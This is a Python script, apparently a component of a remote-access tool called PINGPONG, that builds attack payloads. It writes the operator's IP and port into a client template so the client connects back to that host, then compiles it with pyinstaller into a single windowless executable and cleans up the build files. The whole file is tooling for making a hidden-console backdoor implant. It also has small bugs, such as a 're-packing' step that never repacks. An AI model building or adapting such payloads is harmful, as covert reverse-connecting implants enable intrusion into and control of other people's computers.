# -*- coding:utf-8 -*-
# @payload  :payload packer.py
# @Time      :2022/11/22 19:25:40
# @Author    :D0WE1L1N
from os import system, remove, getcwd
from os.path import isfile, basename
from shutil import move, rmtree
def pack(payload, ip, port):
	command = "pyinstaller -F ./payload/" + payload + ".py -w"
	print("payload>[*]Loading payload......")
	with open("./payload/PINGPONG_payload_file.py", "r", encoding="utf8") as p:
		pay = p.read()
	with open("./payload/PINGPONG_payload.py", "w+", encoding="utf8") as a:
		a.write(pay)
		a.write(f"""
if __name__ == '__main__':
    PINGPONG_client("{ip}", {port})""")
	try:
		system(command)
		print("payload>[*]deleting temp files......")
		if isfile(payload+".exe"):
			remove(payload+".exe")
		move("dist/"+payload+".exe", getcwd())
		remove(payload+".spec")
		rmtree("build")
		rmtree("dist")
		print("payload>[+]Done Successfully")
	except(ImportError):
		print("payload>[*]You might not install pyinstaller, installing it now......")
		system("pip install pyinstaller")
		print("payload>[*]re-packing")
	except(FileNotFoundError):
		print("payload>[*]Something wrong when deleting temp files, but it doesn't really matter")
		print("The payload file may be in the dir: ./dict")
		system(command)


